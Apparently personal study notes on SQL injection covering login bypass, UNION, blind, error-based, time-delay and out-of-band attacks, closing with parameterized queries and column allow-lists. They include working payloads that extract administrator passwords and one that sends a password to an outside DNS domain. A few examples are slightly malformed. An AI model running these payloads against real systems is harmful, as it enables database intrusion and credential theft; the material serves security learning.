# SQL Injection

SQL injection is an attack category in which an attacker tries to modify the database queries through the input parameters. It can result in modification of DB records and even records deletion. Consequently, it affects the app's behaviour. It could be chained with other vulnerabilities to perform various attacks.

---

## Detection & Locations

One can detect SQL injection vulnerabilities, by testing the input fields with various SQL syntax and observing the responses returned:

- `'`
- SQL specific syntax
- Boolean conditions
- Time delays queries
- OAST queries

Most common SQL injection vulnerabilities occur in `WHERE` clause of an `SELECT` SQL query.

**Other common locations are:**

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

---

## A Simple Scenario

On a shopping site, you filter the products with category `Gifts`, and the web app makes the following request:

```http
https://insecure-website.com/products?category=Gifts
```

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---

### Example 1: Commenting Out the Rest of the Query

Attacker can make following request:

- **Input:** `Gifts'--`
- **URL:** `https://insecure-website.com/products?category=Gifts'--`

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

> Now it will also display un-released products.

---

### Example 2: Bypassing Conditions with `OR 1=1`

Or you can do:

- **Input:** `Gifts' OR 1=1--`
- **URL:** `https://insecure-website.com/products?category=Gifts'+OR+1=1--`

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

> Now it will display all the products, even the ones that are not categorized.

---

## Subverting App Logic

The attacker can subvert the app's logic by performing sql injection attacks on the input fields that trigger some logic of the app.

---

### Example 1: Messing with Login Logic

Suppose an app has login form with fields `username` and `password` and it generates an SQL query like:

```sql
SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
```

and the responce is validated if DB returns any record.

In this case, an attacker can input this in the `username` field to bypass the password check:

- **Input:** `username="ahmed'--"`

The db query is like:

```sql
SELECT * FROM users WHERE username = '{username}'--' AND password = '{password}'
```

> This is a well-known where clause vulnerability for logging in.

---

## UNION Attacks

Union attacks can be performed to get data from other tables in teh database.

```sql
SELECT a,b FROM table1 UNION c,d FROM table2
```

`UNION` operator stacks the coloumns vertically.

In this query, `c` will be stacked under `a` and `d` will be stacked under `b`.

So naturally it follows that for this attack to work, following two conditions must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

---

## Determine No. of Coloumns Returned by a Request

### Use `ORDER BY`

You can append `'+OR+ORDER+BY n --` where `n` is incremented squentially. `n` here is the index of the coloumn so when `n > no. of coloumns`, the db would return an error.

---

### `NULL` UNION

Attacker can append `NULL` s with the result to determine the no. of coloumns returned.

```sql
parameter='value' UNION NULL, NULL --'
```

Keep on increasing the no. of `NULL`s until a valid result is returned.

- **Success case:** we will get a `NULL` row appended with the result.
- **Failure case:** we will get a `NULLPOINTEREXCEPTION` error.

> It is worth a try because it satisfies the data type constraint for `UNION` as `NULL` can be converted into any data type. And `ORDER BY` might return generic response.

---

## Database Specific Syntax

Different DBs have Different Syntax.

For example, Oracle requires `FROM` keyword after `UNION` to explicitly ention the table.

Oracle has a default table named `DUAL`, we can use this to mention after `FROM`:

```sql
SELECT * FROM table UNION SELECT NULL,NULL -- FROM DUAL
```

Also MySQL requires a space after `--` or a `#`.

---

### Finding Columns with a Useful Data Type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

```text
Conversion failed when converting the varchar value 'a' to data type int.
```

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

---

## Getting Useful Info from UNION

Consider an example, that we have an api returning data. We determine two coloumns that are string, and then we union those two with usernames and passwords of users table:

```http
/?filter=Life'+UNION+SELECT+usernames+passwords+FROM+users+--
```

But ofcourse for this to work perfectly, you would need to know that there is a table called `users` in the database with exact coloumns `usernames` and `passwords`.


---

### But What If the Target Only Returns One Coloumn?

You can use string concatenation for combining the result of more than one coloumns into one coloumn.

Each db has its own syntax, but in Oracle, it uses `|| 'cat' ||` syntax so the command becomes:

```sql
UNION SELECT username || 'cat' || password FROM users
```

> Now this will only return one coloumn.

---

## Finding Information About Database

- Type and Version of DB
- Tables and Coloumns of DB

The following are some queries to determine the database version for some popular database types:

| Database type | Query |
| :--- | :--- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

For example, you could use a UNION attack with the following input:

```sql
' UNION SELECT @@version--
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

```text
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

---

### `information_schema`

`information_schema` is a metadata archive for the database, so `information_schema` is the folder name, and there are tables like `tables` and `coloumns`:

- `tables` `{table_name}`
- `coloumns` `{coloumn_name, data_type, table_name}`

Apart from just the table and coloumn information, the `information_schema` also holds following stuff:

#### 1. DB Relationships and Constraints
These views tell you how tables link together and what rules enforce data integrity.

- **`information_schema.table_constraints`**: Lists all rules applied to tables, such as `PRIMARY KEY`, `FOREIGN KEY`, `UNIQUE`, and `CHECK` constraints.
- **`information_schema.key_column_usage`**: Maps constraints directly to specific columns. This tells you exactly which column is a Primary Key or Foreign Key.
- **`information_schema.referential_constraints`**: Shows how foreign keys relate to parent tables, including update and delete rules (e.g., `CASCADE` or `SET NULL`).

```sql
SELECT table_name, column_name 
FROM information_schema.key_column_usage 
WHERE constraint_name LIKE '%pk%' OR constraint_name LIKE '%PRIMARY%';
```

#### 2. Saved Logic & Code
These views store the source code and definitions of non-table objects.

- **`information_schema.views`**: Contains the full SQL queries behind every virtual table (view) in the database.
- **`information_schema.routines`**: Lists stored procedures and functions, including their parameters, return types, and SQL source code.
- **`information_schema.parameters`**: Details the input and output arguments for each stored procedure or function.

**Practical Example: Inspect the SQL code of a view**

```sql
SELECT view_definition 
FROM information_schema.views 
WHERE table_name = 'ActiveUserSummary';
```

#### 3. Permissions & Security
These views explain who has permission to perform specific actions.

| View | What It Tracks |
| :--- | :--- |
| `table_privileges` | Shows which users or roles can `SELECT`, `INSERT`, `UPDATE`, or `DELETE` on specific tables. |
| `schema_privileges` | Tracks overall permissions assigned at the schema/database level. |
| `user_privileges` | Lists global server-level privileges assigned to specific database users. |

**Practical Example: Check table permissions for a user**

```sql
SELECT table_name, privilege_type 
FROM information_schema.table_privileges 
WHERE grantee = 'app_user';
```

#### 4. Database Setup & Encoding
These views provide global configuration information about the database environment.

- **`information_schema.schemata`**: Lists all databases/schemas residing on the database server, along with their default character sets.
- **`information_schema.character_sets` & `collations`**: Details supported text encodings (like `utf8mb4`) and sorting/comparison rules (like case-sensitivity settings).

```text
information_schema
├── tables                (What tables exist?)
├── columns               (What columns exist?)
├── table_constraints     (What primary/foreign key rules are active?)
├── key_column_usage      (Which column belongs to which key?)
├── views                 (What SQL queries define my views?)
├── routines              (What functions/procedures are saved?)
└── table_privileges      (Who can access or change these tables?)
```

---

## Blind SQL Injection

> There is no displaying of data !

Consider a site with a cookie:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user.

We can exploit this by using conditional responses:

```sql
...xyz' AND '1' = '1
```

By this we can basically enumerate the passwords or any database information. For example:

```sql
...xyz' AND SUBSTRING ((SELECT Password FROM Users WHERE Username = 'Administrator'),1, 1) > 't
```

Kind of like binary searching, once we hit, we hit and we test the next letter.

> `SUBSTRING` is also called `SUBSTR` on some DBs.

---

## Error Based SQL Injection

We can use errors to infer useful information about the database. These errors can be unhandled Database erorrs, they enable us to infer information even in blind scenarios. Sometimes the error itself returns some information from the database turning the blind scenario into a visible scenario. One possible scenario can be to trigger database errors. We can modify a query to make a database error, only if a certian condition is true or false. This will help us in inference.

> This is why DB errors must be handled gracefully and not just returned to the user.

---

### Example Payload

```sql
'...xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a -- This ' is just for not breaking the syntax, it shouldn't be in the actual payload.
```

The above expression will end in an error, and if that is not handled properly, can be used to infer information like the example below:

```sql
'...xyz' AND (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') < 'm') THEN 1/0 ELSE 'a' END) = 'a -- This ' is just for not breaking the syntax
```

---

### Verbous Errors

Sometimes misconfigured applications display the database errors as it is on the frontend. In some cases it is possible to understand the backend query's structure by these errors.

**Example:**

```text
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This error occured by just putting a single `'` literal where `id` was expected, and now we know the query structure and we can use it to find information about the db.

`Cast()` — We can use `CAST( () AS INT)`

If some data that is being returned as a string, we can induce this to get the possible error like:

```text
ERROR: invalid input syntax for type integer.
```

> The display of error, converts this query from blind to visible. Now we can display data of our choice in this field.

---

## Misconceptions Regarding SQL Injection

### Is It Obsolete?

No, it is still relevant even in the age of ORMs and parameterized queries.

- ORMs have escape hashes, when queries get complex devs use `.raw()` or `FromSqlRaw()` to use raw queries instead to avoid complex ORM modeling. This opens a window for the attacker.
- Parameterized Queries can protect fields but not coloumns. Parametarization actually means that treat whatever the frontend gives as a single value and don't let it break out and make another sql query but they can't protect column names and table names. When the app lets you sort by something, devs often take the user input directly into the `ORDER BY` clause.
- There are a ton of sites out there running on legacy code.
- Second-order SQLi can also affect; like if the attacker has some delete data instruction and it sits in the databasea and later on when that field is used within the app, the query executes deleting the data.

---

### Is Conditional Error Based SQLi the Ultimate Boss?

No again, because devs can hide the errors behind a `200/OK` status code and there would be no way for the attacker to determine if an error ever occured. Moreover, firewalls and optimizers might also hinder the process.

---

## Blind SQLi by Triggering Time Delays

We can introduce delay in our sql queries as a last resort if nothing else seems to be working. Like if the erros are generic and gracefully handled, no applicaiton behavious is anamalous etc.

Since SQL queries are synchronous, the delay in an sql query will also mean a delay in http response.

Different databases have different syntax for these delays. In MSSQL, these delays can be caused by the following syntax:

```sql
IF (1=1) WAITFOR DELAY '0:0:10'
```

---

## Out of Band SQLi

In this type of SQLi, we can extract data from a server without it ever displaying on their site or any time delays. We make the db sql to query our controlled domain, appending the intended data with it, providing us that data in our controlled domain's logs.

Each database has different payloads and methods for DNS routing.

### Time-Delay Payload Progression & Notes

```sql
a9uL8B6fs1fJqqLB' AND (CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') < 'm') THEN pg_sleep(7) ELSE 'a') = 'a
```

```sql
a9uL8B6fs1fJqqLB'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='m') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users)--
```

```sql
a9uL8B6fs1fJqqLB'|| (CASE WHEN (SELECT SUBSTRING(password,1,1) < 'm') THEN pg_sleep(7) ELSE pg_sleep(0) END) --
```

```sql
a9uL8B6fs1fJqqLB'|| (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator' ) > 'm' )  THEN pg_sleep(7) ELSE pg_sleep(0) END) --
```

```sql
a9uL8B6fs1fJqqLB'|| (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator' ) = 'u' )  THEN pg_sleep(7) ELSE pg_sleep(0) END) --
```

> `{First character U}`

Automatically runs a small dictionary of fingerprint probes (`'a'||'b'`, `'a'+'b'`, `'a' 'b'`) and sleep probes (`pg_sleep`, `SLEEP`, `WAITFOR DELAY`) to identify the database engine and which "oracle" works:

- Why T-SQL `WAITFOR` fails on PostgreSQL and how `||` acts as an execution vehicle.
- Why `CASE WHEN` inside a `WHERE` clause needs an outer `(SELECT ...)` wrapper.
- Why database collations break string comparisons and how `ASCII()` + `ord()` solves it.

---

## Out of Band Data Exfiltration

In our query, we make the database to go under DNS domain name resolution to a domain that we control while the subdomain for that request is the data we want to exfiltrate. This way, the data will simply be in our logs.

Different DBs have different ways to perform this.

For Example in T-SQL and MS-SQL:

```http
cookie=...xyz'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

---

## SQL Injection in Different Contexts

Sometimes an application is vulnerable to SQL injection but the firewall is filtering the requests based on curated list of keywords like `SELECT` or `FROM` etc. This doesn't make the app secure because these firewalls can be bypassed.

Both JSON and XML support character encoding schemes, that these firewalls may not have protected against:

- **Plaintext:**

```text
S
```

- **JSON:**

```json
\u0053
```

- **XML:**

```xml
&#x53
```

We can also switch the `CONTENT-TYPE` header in the request; sometimes it helps because the app doesn't have any defenses against the other type of data, merely because it wasn't expecting that.

---

## Second Order SQLi

Also called dynamic sqli it comes into action when a user enters some sqli payload and the payload is safely stored in the database as a single string. And then later on the user makes some request that parses that data again in some query. Sometimes the developer doesn't implement sqli prevention measures on this request because they trust the data cause it was inputted safely into the db. During this processing, the payload acts, thus being called second order sqli.

---

## Preventing SQL Injection

Most common way to prevent it is by using parametarized queries.

```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

The above statement just binds what ever the input is to the query string, and then creates an sql statement.

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

The above lines first create a statement, send template to database for the optimizer to work, and only then send in the value for the field with `?`. This way, the whole input is just considered as a single entity.

> But the catch is that parametarization only works with values not column names.

```java
String query = "SELECT * FROM products ORDER BY " + sortColumn;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

In the above lines, the payload is again just appended and is vulnerable to sqli. If a developer tries to use parametarization here, the DB may throw an error.

The solution is to put an allow-list check here to prevent the data-access from unwanted columns:

```java
Set<String> allowedColumns = Set.of("name", "price", "category");
if (!allowedColumns.contains(sortColumn)) {
    throw new IllegalArgumentException("Invalid sort column");
}
String query = "SELECT * FROM products ORDER BY " + sortColumn; // safe now — sortColumn can only be one of 3 known literals
```
